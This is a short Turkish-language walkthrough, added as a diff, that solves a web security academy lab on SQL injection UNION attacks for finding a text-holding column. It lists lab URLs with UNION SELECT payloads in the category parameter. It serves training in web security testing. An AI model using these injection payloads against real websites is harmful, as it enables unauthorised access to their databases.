@@ -1,0 +1,19 @@
+LAB: SQL injection UNION attack, finding a column containing text
+
+1 - Herhangi bir kategoriyi seçiyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Corporate+gifts
+
+2 - category parametresinin değerini '+UNION+SELECT+'abcdef',NULL,NULL-- ile değiştiriyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+%27abcdef%27,NULL,NULL--
+
+3 - Hata mesaji kalkana kadar. NULL yazısını 'abcdef' ile değiştiriyoruz.
+hata -> Sütun değişkeni string değil.
+hata yok -> Sütun değişkeni string.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,%27abcdef%27,NULL--
+
+4 - Yukardaki gibi doğru sütunu bulduğumuzda ana sayfamızda bir yazı çıkıyor:
+Make the database retrieve the string: 'pcctga', burdaki degeri payloadımızdaki abcdef yerine koyuyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,%27pcctga%27,NULL--
+
+
+
